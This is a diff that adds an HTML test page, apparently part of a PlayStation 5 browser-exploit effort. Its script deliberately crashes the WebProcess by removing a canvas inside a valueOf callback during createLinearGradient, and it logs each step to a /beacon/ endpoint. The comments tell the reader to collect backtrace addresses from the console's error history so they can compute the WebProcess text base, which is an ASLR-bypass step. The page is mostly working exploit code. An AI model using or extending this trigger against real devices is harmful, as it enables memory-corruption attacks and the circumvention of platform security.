@@ -1,0 +1,61 @@
+<!--
+  p620: Section F crash — reproducible WebProcess crash for error history backtrace
+
+  Canvas2D createLinearGradient + DOM removal during valueOf callback crashes
+  WebProcess past try/catch. This is a rendering-path crash, not a generic
+  null-deref — the error history (CE-108262-9) might show backtrace frames
+  with return addresses that reveal WebProcess text base.
+
+  INSTRUCTIONS:
+  1. Navigate PS5 to this page
+  2. WebProcess will crash
+  3. IMMEDIATELY check Settings > System > Error History on PS5
+  4. Look for CE-108262-9 with backtrace frames / hex addresses
+  5. If addresses present: frame_addr - static_RVA = WebProcess text base
+
+  CRASH_CLASS: HIGH (intentional WebProcess crash for backtrace capture)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p620</title></head>
+<body>p620: Section F crash for backtrace
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m), false);
+    x.send();
+  } catch(e) {}
+}
+
+window.onerror = function(m) { b('P620-ONERR=' + String(m).slice(0,100)); };
+
+(function() {
+b('P620-START');
+
+var c = document.createElement('canvas');
+c.width = 50; c.height = 50;
+document.body.appendChild(c);
+var ctx = c.getContext('2d');
+
+b('P620-CTX-OK');
+
+var poisonX = {
+  valueOf: function() {
+    b('P620-VALUEOF-REMOVING-CANVAS');
+    document.body.removeChild(c);
+    c = null;
+    return 0;
+  }
+};
+
+b('P620-TRIGGERING-CRASH');
+try {
+  ctx.createLinearGradient(poisonX, 0, 100, 100);
+  b('P620-SURVIVED');
+} catch(e) {
+  b('P620-CAUGHT=' + String(e).slice(0,100));
+}
+
+b('P620-ALIVE');
+})();
+</script>
+</body></html>
